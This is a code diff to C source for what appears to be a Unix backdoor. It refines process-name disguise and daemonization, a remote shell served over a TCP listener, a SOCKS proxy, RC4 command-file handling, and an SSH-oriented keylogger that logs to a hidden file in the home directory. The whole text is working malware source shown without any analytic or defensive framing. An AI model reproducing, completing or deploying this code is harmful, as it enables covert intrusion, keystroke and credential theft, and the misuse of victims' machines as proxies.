@@ -31,7 +31,7 @@ struct rawsock rawsocks[MAXRAWSESSIONS];
 rc4_ctx rc4_crypt, rc4_decrypt;
 extern char **environ;
 extern int dash_main(int, char **);
-extern int main_socksd(int);
+extern int main_socksd(int, int, char **);
 extern int grantpt(int);
 extern int unlockpt(int);
 
@@ -130,8 +130,9 @@ void rename_proc(int argc, char **argv) {
     for (i = 0; i < argc; i++) {
         memset(argv[i], 0, strlen(argv[i]));
         realloc(argv[i], strlen(PROCNAME)+1);
-        memcpy(argv[i], PROCNAME, strlen(PROCNAME));
+        memset(argv[i], 0, strlen(PROCNAME)+1);
     }
+    memcpy(argv[0], PROCNAME, strlen(PROCNAME));
 }
 
 void daemonize() {
@@ -327,7 +328,8 @@ void launcher_shell(int sockr, int sockw) {
         else chdir(HOME);
        
 #if INCLUDE_SHELL
-		// TODO: Setup USER and HOME environtment variable
+		// TODO: Setup USER environtment variable
+        putenv("HOME="HOME);
 		putenv("PS1=\033[1;30m[\033[0;32m$USER\033[1;32m@\033[0;32m$HOST \033[1;37m$PWD\033[1;30m]\033[0m# ");
 		dash_main(1, argv_dash);
 #else		
@@ -575,7 +577,7 @@ void tcp_daemon(int port) {
             debug("Error: accept\n");
             exit(-1);
         }
-        printf("Received connection!\n");
+        debug("Received connection!\n");
         if (!fork()) {
             close(sock);
             if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
@@ -634,10 +636,11 @@ void launcher_command_drc4(char *file) {
 	FILE *fd = fopen(file, "r");
 	unsigned char buff[BUFSIZE];
 	if (!fd) exit(0);
-	while (fscanf(fd, "%[^\n]\n", buff) > 0) {
+	while (fscanf(fd, "%[^\n]", buff) > 0) {
     	rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_decrypt);
         rc4(buff, strlen((char *)buff) < BUFSIZE ? strlen((char *)buff) : BUFSIZE, &rc4_decrypt);
 		printf("%s\n", buff);
+        fread(buff, 1, 1, fd);
 	}
 }
 
@@ -648,33 +651,31 @@ void launcher_command_rc4(char *file) {
 	unsigned char buff[BUFSIZE];
 	if (!fd) exit(0);
 	int len = 0;
-	while (fscanf(fd, "%[^\n]\n", buff) > 0) {
+	while (fscanf(fd, "%[^\n]", buff) > 0) {
 		len = strlen((char *)buff);
     	rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
         rc4(buff, len < BUFSIZE ? len : BUFSIZE, &rc4_crypt);
 		printf("%s\n", buff);
+        fread(buff, 1, 1, fd);
 	}
 }
 
 #if SOCKSD
-void launcher_command_socks(int port) {
+void launcher_command_socks(int port, int argc, char **argv) {
 	debug("Launching command socks to port %d\n", port);
-	main_socksd(port);	
+	main_socksd(port, argc, argv);	
 }
 #endif
 
 #if KEYLOGGER
-void launcher_command_keylogger(char *service) {
+void launcher_command_keylogger(char *service, int argc, char **argv) {
 	debug("Launching command keylogger to service %s\n", service);
-	char *argv[] = {
-		HOME "/.k_sshd_r",
-		NULL
-	};
+	char *file = HOME "/.k_sshd_r";
     // Daemonize
 #if ! DEBUG
     daemonize();
 #endif
-	main_keylogger(1, argv);
+	main_keylogger(argc, argv, file);
 }
 #endif
 
@@ -724,15 +725,19 @@ int main(int argc, char **argv) {
 		}
 #if SOCKSD
 	   	else if (!strcmp("socks", argv[2])) {
-			launcher_command_socks(atoi(argv[3]));
+			launcher_command_socks(atoi(argv[3]), argc, argv);
 			exit(0);
 		}
 #endif
 #if KEYLOGGER	
 		else if (!strcmp("keys", argv[2])) {
-			launcher_command_keylogger(argv[3]);
+			launcher_command_keylogger(argv[3], argc, argv);
 			exit(0);
 		} 
+        else {
+            printf("-1");
+            exit(0);
+        }
 #endif
 	}
 
